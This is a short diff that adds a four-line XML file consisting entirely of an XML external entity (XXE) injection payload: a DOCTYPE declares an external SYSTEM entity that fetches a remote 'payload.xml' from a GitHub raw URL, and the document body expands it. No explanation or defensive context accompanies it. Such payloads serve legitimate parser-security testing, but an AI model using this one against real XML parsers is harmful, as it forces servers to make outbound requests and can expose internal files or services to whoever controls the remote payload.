@@ -1,0 +1,4 @@
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "https://raw.githubusercontent.com/AdamLarabi/payload-xml/main/payload.xml">
+]>
+<foo>&xxe;</foo>
